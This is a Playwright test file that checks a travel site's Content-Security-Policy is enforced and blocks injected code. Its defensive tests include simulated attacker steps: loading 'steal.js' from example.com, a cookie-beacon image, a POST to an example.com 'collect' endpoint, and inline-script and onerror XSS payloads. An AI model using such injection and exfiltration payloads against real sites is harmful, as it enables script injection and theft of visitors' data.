import { expect, test } from "../fixtures/test";
import { listenForViolations, violations } from "../helpers/csp";

// The Content-Security-Policy is ENFORCED (ticket 156), in a real browser.
//
// The policy is a list the website sends with every page: where scripts,
// styles, images and connections may come from. The browser refuses
// anything not on the list, so a script an attacker sneaks into a page
// never runs. src/proxy.test.ts checks the list itself; this file checks
// what a browser does with it.
//
// Read-only: page loads only. The "attack" scripts point at example.com,
// which the test's own safety net also stops, so nothing ever leaves the
// laptop.

const PLACE = "/destinations/5d1155a1-6e40-417d-9c84-09a990cae00d";
const ACCOMMODATION = "/accommodations/fc4df660-ddb0-4927-8e00-406a011c05cf";
// /admin/login preloads the dashboard (router.prefetch in AdminSignIn.tsx).
// For a visitor without an admin login that preload is a 404, and on a
// local production build (`next start`) the browser never finishes reading
// it, so the network never goes quiet there (found 2026-11-20; the code
// before the nonce change does the same, and Vercel finishes it). That
// page has no photos that load late, so "load" is enough there.
const PAGES = ["/", PLACE, ACCOMMODATION, "/login", "/forgot-password", "/admin/login"];

test.describe("The Content-Security-Policy is enforced", () => {
  // The same header on every screen size: the header check runs once.
  test("every page arrives with the enforced policy, not only a warning", async ({ page, isMobile }) => {
    test.skip(isMobile, "Checked once, on the laptop project.");

    for (const path of PAGES) {
      const response = await page.goto(path);
      const headers = response!.headers();
      const policy = headers["content-security-policy"] ?? "";

      expect(policy, `${path} has no Content-Security-Policy`).not.toBe("");
      expect(headers["content-security-policy-report-only"], `${path} only warns`).toBeUndefined();
      for (const rule of ["default-src 'self'", "object-src 'none'", "frame-ancestors 'none'", "base-uri 'self'", "form-action 'self'"]) {
        expect(policy, `${path} is missing ${rule}`).toContain(rule);
      }
    }
  });

  test("a hidden admin page answers 404 and still carries the policy", async ({ request, isMobile }) => {
    test.skip(isMobile, "Checked once, on the laptop project.");

    const response = await request.get("/admin/reports");

    expect(response.status()).toBe(404);
    expect(response.headers()["content-security-policy"]).toContain("default-src 'self'");
  });

  test("the app's own pages break no rule of the policy (nothing of ours is blocked)", async ({ page }) => {
    await listenForViolations(page);

    for (const path of PAGES) {
      await page.goto(path);
      await expect(page.getByRole("heading", { level: 1 })).toBeVisible();
      await page.waitForLoadState(path === "/admin/login" ? "load" : "networkidle");

      expect(await violations(page), `the policy blocked something on ${path}`).toEqual([]);
    }

    // And the pages still work: the search answers, and a place opens.
    await page.goto("/");
    await page.getByRole("combobox", { name: "Where to?" }).fill("batchoy");
    await expect(page.getByRole("option").first()).toBeVisible();
    await page.getByRole("combobox", { name: "Where to?" }).press("Enter");
    await expect(page).toHaveURL(/\/destinations\/[0-9a-f-]{36}$/);
    expect(await violations(page)).toEqual([]);
  });

  test("the browser blocks a script, an image and a connection to a site not on the list", async ({ page }) => {
    await listenForViolations(page);
    await page.goto("/");
    await expect(page.getByRole("heading", { level: 1 })).toBeVisible();

    // Act: what an attacker's injected code would try.
    await page.evaluate(async () => {
      const script = document.createElement("script");
      script.src = "https://example.com/steal.js";
      document.body.append(script);
      const image = document.createElement("img");
      image.src = "https://example.com/pixel.gif?cookie=1";
      document.body.append(image);
      await fetch("https://example.com/collect", { method: "POST", body: "data" }).catch(() => undefined);
    });

    // Assert: all three refused by the policy itself ("enforce"), not only
    // reported.
    await expect
      .poll(async () => (await violations(page)).map((v) => v.directive).sort())
      .toEqual(["connect-src", "img-src", "script-src-elem"]);
    for (const violation of await violations(page)) {
      expect(violation.blocked).toContain("example.com");
      expect(violation.disposition).toBe("enforce");
    }
  });

  test("the browser refuses injected inline code: a <script> and an onerror handler (nonce, ZAP 2026-11-20)", async ({ page }) => {
    await listenForViolations(page);
    await page.goto("/");
    await expect(page.getByRole("heading", { level: 1 })).toBeVisible();

    // Act: the classic cross-site scripting (XSS) tricks, as if a review's
    // text ever reached the page as HTML. With 'unsafe-inline' both ran.
    await page.evaluate(() => {
      const script = document.createElement("script");
      script.textContent = "window.__pwned = 'script'";
      document.body.append(script);
      const holder = document.createElement("div");
      holder.innerHTML = `<img src="/no-such-photo.gif" onerror="window.__pwned = 'onerror'">`;
      document.body.append(holder);
    });

    // Assert: neither ran, and the policy says why.
    await expect
      .poll(async () => (await violations(page)).map((v) => v.directive).sort())
      .toEqual(["script-src-attr", "script-src-elem"]);
    expect(await page.evaluate(() => (window as unknown as { __pwned?: string }).__pwned)).toBeUndefined();
    for (const violation of await violations(page)) {
      expect(violation.blocked).toBe("inline");
      expect(violation.disposition).toBe("enforce");
    }
  });
});
